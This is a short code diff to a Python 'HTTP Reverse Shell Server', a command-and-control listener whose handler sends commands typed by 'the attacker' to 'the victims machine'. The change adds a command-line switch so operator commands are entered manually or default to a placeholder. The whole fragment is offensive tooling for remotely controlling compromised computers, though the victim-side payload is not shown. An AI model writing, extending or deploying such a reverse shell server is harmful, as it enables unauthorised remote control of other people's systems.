@@ -4,6 +4,7 @@ import socketserver
 import http.server
 import cgi
 from colorama import Fore, Back, Style
+import sys
 
 PORT = 8080
 """
@@ -12,6 +13,11 @@ Date: November 1, 2019
 
 HTTP Reverse Shell Server
 """
+
+if len(sys.argv) == 2:
+    MANUAL = True
+else:
+    MANUAL = False
 
 
 class ReverseShellHandler(http.server.BaseHTTPRequestHandler):
@@ -28,10 +34,11 @@ class ReverseShellHandler(http.server.BaseHTTPRequestHandler):
         it requires input from the attacker that will 
         be sent back to the victims machine
         """
-
-        command = input(Fore.YELLOW + ">> ")
-
-        print(Style.RESET_ALL)
+        if MANUAL:
+            command = input(Fore.YELLOW + ">> ")
+            print(Style.RESET_ALL)
+        else:
+            command = '!'
 
         # boilerplate http
         self.send_response(200)
